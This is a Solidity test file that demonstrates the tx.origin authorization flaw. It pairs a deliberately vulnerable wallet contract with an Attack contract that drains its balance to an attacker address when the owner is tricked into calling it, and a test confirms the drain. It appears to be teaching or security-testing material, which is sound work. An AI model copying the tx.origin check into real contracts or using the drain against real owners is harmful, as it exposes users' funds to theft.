// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.6;

import "ds-test/test.sol";

contract TxOrigin {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    receive() external payable {}

    function withdrawAll(address recipient) public {
        require(tx.origin == owner);
        payable(recipient).transfer(address(this).balance);
    }
}

contract Attack {
    TxOrigin txOrigin;

    receive() external payable {}

    constructor(TxOrigin _txOrigin) {
        txOrigin = _txOrigin;
    }

    function callMePlease() public {
        txOrigin.withdrawAll(address(0xababababab));
    }
}

contract TxOriginTest is DSTest {
    TxOrigin txOrigin;
    Attack attack;

    address attacker = address(0xababababab);

    receive() external payable {}

    function setUp() public {
        txOrigin = new TxOrigin();
        attack = new Attack(txOrigin);
        payable(txOrigin).transfer(100);
    }

    function testWithdrawAll() public {
        uint start = address(this).balance;
        txOrigin.withdrawAll(address(this));
        assertEq(start + 100, address(this).balance);
    }

    /**
     * Convince the mark to call this function.
     */
    function testAttack() public {
        attack.callMePlease();
        assertEq(address(0xababababab).balance, 100);
    }
}
